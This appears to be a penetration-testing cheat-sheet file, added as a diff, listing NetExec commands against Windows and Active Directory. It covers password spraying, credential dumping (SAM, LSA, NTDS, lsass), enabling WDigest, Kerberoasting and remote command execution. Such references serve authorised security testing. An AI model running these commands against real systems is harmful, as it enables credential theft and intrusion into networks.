@@ -1,0 +1,118 @@
+% nxc, NetExec, windows, Active directory
+
+# enumerate hosts, network
+nxc smb <ip/cidr> 
+
+# enumerate password policy
+nxc smb <ip> -u <user> -p '<password>' --pass-pol 
+
+# enumerate null session
+nxc smb <ip> -u '' -p '' 
+
+# enumerate anonymous login
+nxc smb <ip> -u 'a' -p '' 
+
+# enumerate active sessions
+nxc smb <ip> -u <user> -p '<password>' --sessions 
+
+# enumerate domain users
+nxc smb <ip> -u <user> -p '<password>' --users 
+
+# enumerate users by bruteforce the RID
+nxc smb <ip> -u <user> -p '<password>' --rid-brute 
+
+# enumerate domain groups
+nxc smb <ip> -u <user> -p '<password>' --groups 
+
+# enumerate local groups
+nxc smb <ip> -u <user> -p '<password>' --local-groups 
+
+# enumerate shares
+nxc smb <ip> -u <user> -p <password> -d <domain> --shares 
+
+# List all readable files
+nxc smb <ip> -u <user> -p <password> -M spider_plus
+
+# enumerate disks
+nxc smb <ip> -u <user> -p '<password>' --disks 
+
+# enumerate smb target not signed
+nxc smb <ip> --gen-relay-list smb_targets.txt 
+
+# enumerate logged users
+nxc smb <ip> -u <user> -p '<password>' --loggedon-users 
+
+# enable wdigest
+nxc smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable 
+
+# loggout current user
+nxc smb <ip> -u <user> -p '<password>' -x 'quser'
+
+# loggout user by UID
+nxc smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output 
+
+# local-auth
+nxc smb <ip> -u <user> -p <password> --local-auth 
+
+# local-auth with hash
+nxc smb <ip> -u <user> -H <hash> --local-auth 
+
+# domain auth
+nxc smb <ip> -u <user> -p <password> -d <domain> 
+
+# kerberos auth
+nxc smb <ip> --kerberos 
+
+# Dump SAM
+nxc smb <ip> -u <user> -p <password> -d <domain> --sam 
+
+# Dump LSA
+nxc smb <ip> -u <user> -p <password> -d <domain> --lsa 
+
+# dump ntds.dit
+nxc smb <ip> -u <user> -p <password> -d <domain> --ntds 
+
+# dump lsass
+nxc smb <ip> -u <user> -p <password> -d <domain> -M lsassy 
+
+# dump lsass - with bloodhond update
+nxc smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin> 
+
+# password spray (user=password)
+nxc smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success 
+
+# password spray multiple test 
+nxc smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success 
+
+# put file
+nxc smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt> 
+
+# get file
+nxc smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file> 
+
+# ASREPRoast enum without authentication
+
+nxc ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip> 
+
+# ASREPRoast enum with authentication
+
+Hashcat format  -m 18200  
+nxc ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip> 
+
+# Kerberoasting
+nxc ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip> 
+
+# Unconstrained delegation 
+nxc ldap <ip> -u <user> -p '<password>' --trusted-for-delegation 
+
+# winrm-auth
+nxc winrm <ip> -u <user> -p <password> 
+
+# mssql password spray
+nxc mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce 
+
+# mssql execute query
+nxc mssql <ip> -u <user> -p '<password>' --local-auth -q '<mssql_query>' 
+
+# mssql execute command
+nxc mssql <ip> -u <user> -p '<password>' --local-auth -x <command> 
